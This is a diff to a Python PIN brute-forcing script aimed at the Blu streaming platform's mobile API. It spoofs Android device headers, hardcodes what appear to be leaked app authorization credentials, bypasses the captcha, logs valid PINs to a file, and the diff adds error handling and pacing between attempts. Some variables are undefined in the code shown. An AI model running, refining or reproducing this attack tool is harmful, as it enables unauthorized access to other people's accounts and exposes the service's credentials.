@@ -1,9 +1,7 @@
-import sys
-from colorama import Fore, init, Style
+from colorama import Fore
 import threading, requests
 import ctypes, time, os
 from pystyle import Colors, Colorate
-import colorama
 
 class Recoo:
     def __init__(self):
@@ -54,48 +52,53 @@ class Recoo:
         return session
     
     def check_account(self, username, password):
-        session = self.session()
-        json = {"pin":username,"user_id":""}
+        try:
+            session = self.session()
+            json = {"pin":username,"user_id":""}
 
 
-        head = {
-                    "Accept-Encoding": "gzip",
-                    "Accept-Language": "tr-TR",
-                    "AppAuthorization": "Basic 58b402bc058d029c8092da50:naEBANIWWu4LGvr82umVCDezA/KJep50+Km7ojdR0ROw2RlKy7a5OBauWzNOV5/TX2pREy1Sc/sg2TwLUdFfcQ==",
-                    "AppPlatform": "com.blu.lama.phone.android",
-                    "AppVersion": "62124541",
-                    "Authorization": "Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6",
-                    "AuthorizationToken": token,
-                    "CaptchaProvider": "",
-                    "CaptchaToken": "",
-                    "captchaTokenRequired": "false",
-                    "Connection": "Keep-Alive",
-                    "Content-Length": "35",
-                    "Content-Type": "application/json; charset=UTF-8",
-                    "DeviceId": "1c99d003ff548e09",
-                    "DeviceName": "Samsung SM-G991B",
-                    "DeviceResolution": "1080x2176",
-                    "Host": "adapter.blupoint.io",
-                    "User-Agent": "okhttp/3.12.12",
-                    "x-captcha-api-version": "v2",
-                    "X-INSTANA-ANDROID": "e26ca567-c081-41ac-a005-17361fdaa6a1"
-        }
+            head = {
+                        "Accept-Encoding": "gzip",
+                        "Accept-Language": "tr-TR",
+                        "AppAuthorization": "Basic 58b402bc058d029c8092da50:naEBANIWWu4LGvr82umVCDezA/KJep50+Km7ojdR0ROw2RlKy7a5OBauWzNOV5/TX2pREy1Sc/sg2TwLUdFfcQ==",
+                        "AppPlatform": "com.blu.lama.phone.android",
+                        "AppVersion": "62124541",
+                        "Authorization": "Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6",
+                        "AuthorizationToken": token,
+                        "CaptchaProvider": "",
+                        "CaptchaToken": "",
+                        "captchaTokenRequired": "false",
+                        "Connection": "Keep-Alive",
+                        "Content-Length": "35",
+                        "Content-Type": "application/json; charset=UTF-8",
+                        "DeviceId": "1c99d003ff548e09",
+                        "DeviceName": "Samsung SM-G991B",
+                        "DeviceResolution": "1080x2176",
+                        "Host": "adapter.blupoint.io",
+                        "User-Agent": "okhttp/3.12.12",
+                        "x-captcha-api-version": "v2",
+                        "X-INSTANA-ANDROID": "e26ca567-c081-41ac-a005-17361fdaa6a1"
+            }
 
-        uri = "https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/profiles/verify-pin?profileId=%s" % (profil,)
-        check = session.post(url=uri, json = json, headers = head)
-        if "errors.invalidPinError" in check.text:
-            self.invalid += 1
-            self.title()
-        elif "failedRequestAttempt" in check.text:
-            return check
-        else: 
-            check2 = session.post(url=uri, json = json, headers = head) ## Tekrar Kontrol ##
-            if "errors.invalidPinError" not in check2.text:
-                with open("Pin.txt", "a") as f: f.write("{}".format(username))
-                self.recooo = True
-                print(Fore.MAGENTA+"Pin:"+username)
-                os.remove("Blu-Token.txt")
-                os.remove("Blu-Access.txt")
+            uri = "https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/profiles/verify-pin?profileId=%s" % (profil,)
+            check = session.post(url=uri, json = json, headers = head)
+            if "errors.invalidPinError" in check.text:
+                self.invalid += 1
+                self.title()
+            elif "failedRequestAttempt" in check.text:
+                return check
+            else:
+                time.sleep(2)
+                check2 = session.post(url=uri, json = json, headers = head) ## Tekrar Kontrol ##
+                if "errors.invalidPinError" not in check2.text:
+                    with open("Pin.txt", "a") as f: f.write("{}".format(username))
+                    self.recooo = True
+                    print(Fore.MAGENTA+"Pin:"+username)
+                    os.remove("Blu-Token.txt")
+                    os.remove("Blu-Access.txt")
+        except:
+            time.sleep(1)
+            pass
 
             
 
